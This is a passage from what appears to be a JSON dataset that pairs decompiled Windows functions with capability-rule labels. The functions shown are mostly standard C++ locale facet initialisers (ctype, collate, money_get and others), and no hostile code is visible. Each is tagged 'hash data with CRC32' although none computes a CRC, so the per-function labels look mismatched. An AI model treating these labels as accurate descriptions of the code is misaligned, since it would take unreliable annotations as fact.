*(puVar1 + arg_14h + -1) = 0;\n                }\n            }\n            else if (arg_14h != 0) {\n                if (-1 < iVar2) {\n                    if (var_468h == arg_14h) goto code_r0x0045a577;\n                    goto code_r0x0045a52a;\n                }\n                *puVar1 = 0;\n            }\n        }\n        else if (((arg_14h != 0) || (iVar2 == 0)) && (var_468h != arg_14h)) {\ncode_r0x0045a52a:\n            *(puVar1 + var_468h) = 0;\n        }\n    }\n    fcn.0045a88c();\n    in_stack_fffffb5c = arg_18h;\n    if (var_478h != '\\0') {\n        *(var_484h + 0x350) = *(var_484h + 0x350) & 0xfffffffd;\n    }\ncode_r0x0045a552:\n    fcn.0043a2e7(in_stack_fffffb5c);\n    return;\n}\n",
        "token_count": 819
    },
    "00422115": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00422115(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = vtable.std::codecvt_char__char__struct__Mbstatet_.0;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 483
    },
    "00422192": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00422192(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    iVar4 = 0;\n    bVar3 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        iVar2 = fcn.0043a4f7(0x18, uVar5);\n        *(unaff_EBP + -0x10) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 != 0) {\n            iVar4 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar4 == 0) {\n                iVar2 = 0x486181;\n            }\n            else {\n                iVar2 = *(iVar4 + 0x18);\n                if (iVar2 == 0) {\n                    iVar2 = iVar4 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(iVar2);\n            bVar3 = true;\n            iVar4 = fcn.00421b48(uVar5, 0);\n        }\n        *piVar1 = iVar4;\n        if (bVar3) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 418
    },
    "0042220d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042220d(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = vtable.std::num_get_char__class_std::istreambuf_iterator_char__struct_std::char_traits_char___.0;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 492
    },
    "0042228a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042228a(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = vtable.std::num_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 492
    },
    "00422307": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00422307(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x3c;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(0x18, uVar5);\n        *(unaff_EBP + -0x14) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(arg_8h_00);\n            ppcVar3[1] = NULL;\n            bVar4 = true;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar3 = vtable.std::numpunct_char_.0;\n            fcn.004234f9(uVar5, 1);\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 526
    },
    "00425ff4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00425ff4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    code *pcVar5;\n    uint arg_10h_00;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.0043ad3e(4);\n    puVar1 = *(unaff_EBP + 0x14);\n    uVar2 = *puVar1;\n    if (((uVar2 & 1) == 0) && (puVar1[6] != 0)) {\n        *(unaff_EBP + -4) = 0;\n        arg_10h_00 = fcn.0045122c(*(unaff_EBP + 0xc), puVar1 + 2);\n        if ((uVar2 & 4) == 0) {\n            fcn.0042608d(*(unaff_EBP + 8), puVar1[6], arg_10h_00);\n        }\n        else {\n            fcn.0042609d(*(unaff_EBP + 8), puVar1[6], arg_10h_00, 1);\n        }\n    }\n    else {\n        ppiVar3 = *(unaff_EBP + 0xc);\n        fcn.00451500(*(unaff_EBP + 8), ppiVar3, *(unaff_EBP + 0x10));\n        if (((*puVar1 & 8) != 0) && (piVar4 = *ppiVar3,  piVar4 != NULL)) {\n            pcVar5 = *(*piVar4 + 4);\n            (**0x4742a4)(piVar4);\n            (*pcVar5)();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 451
    },
    "00429fe6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00429fe6(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    iVar4 = 0;\n    bVar3 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        iVar2 = fcn.0043a4f7(0x34, uVar5);\n        *(unaff_EBP + -0x10) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 != 0) {\n            iVar4 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar4 == 0) {\n                iVar2 = 0x486181;\n            }\n            else {\n                iVar2 = *(iVar4 + 0x18);\n                if (iVar2 == 0) {\n                    iVar2 = iVar4 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(iVar2);\n            bVar3 = true;\n            iVar4 = fcn.004292be(uVar5, 0);\n        }\n        *piVar1 = iVar4;\n        if (bVar3) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 418
    },
    "0042a061": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a061(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    iVar4 = 0;\n    bVar3 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        iVar2 = fcn.0043a4f7(0x34, uVar5);\n        *(unaff_EBP + -0x10) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 != 0) {\n            iVar4 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar4 == 0) {\n                iVar2 = 0x486181;\n            }\n            else {\n                iVar2 = *(iVar4 + 0x18);\n                if (iVar2 == 0) {\n                    iVar2 = iVar4 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(iVar2);\n            bVar3 = true;\n            iVar4 = fcn.004292f7(uVar5, 0);\n        }\n        *piVar1 = iVar4;\n        if (bVar3) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 419
    },
    "0042a0dc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a0dc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    code **ppcVar5;\n    uint *arg_8h_00;\n    int32_t unaff_EBP;\n    ulong uVar6;\n    uint var_68h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x5c;\n    fcn.0043ad07();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    bVar3 = false;\n    *(unaff_EBP + -0x2c) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x30) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar5 = fcn.0043a4f7(0x10, arg_8h_01);\n        *(unaff_EBP + -0x34) = ppcVar5;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar5 == NULL) {\n            ppcVar5 = NULL;\n        }\n        else {\n            arg_8h_00 = fcn.004353db(unaff_EBP + -0x28);\n            uVar2 = arg_8h_00[5];\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x30) = 1;\n            if (0xf < uVar2) {\n                arg_8h_00 = *arg_8h_00;\n            }\n            fcn.004015d0(arg_8h_00);\n            ppcVar5[1] = NULL;\n            bVar4 = true;\n            bVar3 = true;\n            *ppcVar5 = vtable.std::collate_unsigned_short_int_.0;\n            uVar6 = fcn.00439a13();\n            ppcVar5[2] = uVar6;\n            ppcVar5[3] = uVar6 >> 0x20;\n        }\n        *piVar1 = ppcVar5;\n        if (bVar3) {\n            fcn.004016b0();\n        }\n        if (bVar4) {\n            fcn.00406810();\n        }\n    }\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 611
    },
    "0042a17e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a17e(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    code **ppcVar5;\n    uint *arg_8h_00;\n    int32_t unaff_EBP;\n    ulong uVar6;\n    uint var_68h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x5c;\n    fcn.0043ad07();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    bVar3 = false;\n    *(unaff_EBP + -0x2c) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x30) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar5 = fcn.0043a4f7(0x10, arg_8h_01);\n        *(unaff_EBP + -0x34) = ppcVar5;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar5 == NULL) {\n            ppcVar5 = NULL;\n        }\n        else {\n            arg_8h_00 = fcn.004353db(unaff_EBP + -0x28);\n            uVar2 = arg_8h_00[5];\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x30) = 1;\n            if (0xf < uVar2) {\n                arg_8h_00 = *arg_8h_00;\n            }\n            fcn.004015d0(arg_8h_00);\n            ppcVar5[1] = NULL;\n            bVar4 = true;\n            bVar3 = true;\n            *ppcVar5 = vtable.std::collate_wchar_t_.0;\n            uVar6 = fcn.00439a13();\n            ppcVar5[2] = uVar6;\n            ppcVar5[3] = uVar6 >> 0x20;\n        }\n        *piVar1 = ppcVar5;\n        if (bVar3) {\n            fcn.004016b0();\n        }\n        if (bVar4) {\n            fcn.00406810();\n        }\n    }\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 611
    },
    "0042a220": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a220(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(0x44, uVar5);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(arg_8h_00);\n            ppcVar3[1] = NULL;\n            *ppcVar3 = vtable.std::ctype_unsigned_short_int_.0;\n            bVar4 = true;\n            fcn.0042ece3(uVar5);\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 486
    },
    "0042a2a5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a2a5(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(0x44, uVar5);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(arg_8h_00);\n            ppcVar3[1] = NULL;\n            *ppcVar3 = vtable.std::ctype_wchar_t_.0;\n            bVar4 = true;\n            fcn.0042ece3(uVar5);\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 488
    },
    "0042a32a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a32a(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = vtable.std::messages_unsigned_short_int_.0;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 478
    },
    "0042a3a7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a3a7(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = vtable.std::messages_wchar_t_.0;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 479
    },
    "0042a424": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a424(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = \n            vtable.std::money_get_unsigned_short_int__class_std::istreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n            ;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 502
    },
    "0042a4a1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a4a1(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = \n            vtable.std::money_get_wchar_t__class_std::istreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 502
    },
    "0042a51e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a51e(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = \n            vtable.std::money_put_unsigned_short_int__class_std::ostreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n            ;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 503
    },
    "0042a59b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
